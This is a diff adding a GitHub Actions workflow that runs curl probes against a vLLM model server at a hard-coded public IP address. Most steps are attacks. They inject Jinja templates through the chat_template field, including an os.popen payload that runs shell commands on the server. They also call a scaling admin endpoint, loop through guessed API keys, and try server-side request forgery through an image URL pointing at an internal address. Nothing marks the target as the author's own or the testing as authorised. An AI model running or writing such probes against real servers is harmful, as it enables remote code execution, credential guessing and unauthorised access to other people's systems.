@@ -1,0 +1,36 @@
+name: ul5685vllm2
+on: workflow_dispatch
+permissions:
+  contents: write
+jobs:
+  v:
+    runs-on: ubuntu-latest
+    timeout-minutes: 25
+    steps:
+      - name: vllm2
+        run: |
+          set +e
+          B=http://123.184.7.135:8000
+          echo "=== invocations proper"
+          curl -s -m 30 -X POST -H 'Content-Type: application/json' -d '{"model":"qwen3.8-27b","messages":[{"role":"user","content":"say OK"}],"max_tokens":8}' $B/invocations -w '\n  code=%{http_code}\n' | head -c 700; echo
+          echo "=== invocations ssti chat_template"
+          curl -s -m 30 -X POST -H 'Content-Type: application/json' -d '{"model":"qwen3.8-27b","messages":[{"role":"user","content":"hi"}],"max_tokens":4,"chat_template":"{{7*7}}"}' $B/invocations -w '\n  code=%{http_code}\n' | head -c 800; echo
+          echo "=== invocations ssti popen"
+          curl -s -m 30 -X POST -H 'Content-Type: application/json' -d '{"model":"qwen3.8-27b","messages":[{"role":"user","content":"hi"}],"max_tokens":4,"chat_template":"{{cycler.__init__.__globals__.os.popen(\"id;hostname\").read()}}"}' $B/invocations -w '\n  code=%{http_code}\n' | head -c 900; echo
+          echo "=== tokenize correct model"
+          curl -s -m 15 -X POST -H 'Content-Type: application/json' -d '{"model":"qwen3.8-27b","prompt":"hi"}' $B/tokenize -w '\n  code=%{http_code}\n' | head -c 300; echo
+          echo "=== scale elastic ep"
+          curl -s -m 20 -X POST -H 'Content-Type: application/json' -d '{"new_data_parallel_size":2}' $B/scale_elastic_ep -w '\n  code=%{http_code}\n' | head -c 400; echo
+          curl -s -m 10 $B/is_scaling_elastic_ep -w ' code=%{http_code}\n' | head -c 200; echo
+          echo "=== api key guesses"
+          for k in sk-1234 EMPTY vllm qwen EMPTY_KEY none; do
+            c=$(curl -s -o /tmp/k -m 8 -w '%{http_code}' -H "Authorization: Bearer $k" $B/v1/models)
+            echo "key=$k code=$c $(head -c 80 /tmp/k|tr -d '\n')"
+          done
+          echo "=== auth header variants on invocations"
+          curl -s -m 20 -X POST -H 'Content-Type: application/json' -H 'Authorization: Bearer ' -d '{"model":"qwen3.8-27b","messages":[{"role":"user","content":"hi"}],"max_tokens":2}' $B/invocations -w '\n  code=%{http_code}\n' | head -c 300; echo
+          echo "=== model list via /load /version"
+          curl -s -m 8 $B/load; echo; curl -s -m 8 $B/version; echo
+          echo "=== image url ssrf test (invocations)"
+          curl -s -m 25 -X POST -H 'Content-Type: application/json' -d '{"model":"qwen3.8-27b","messages":[{"role":"user","content":[{"type":"image_url","image_url":{"url":"http://192.168.0.23:8899/img"}},{"type":"text","text":"describe"}]}],"max_tokens":4}' $B/invocations -w '\n  code=%{http_code}\n' | head -c 600; echo
+          echo DONE
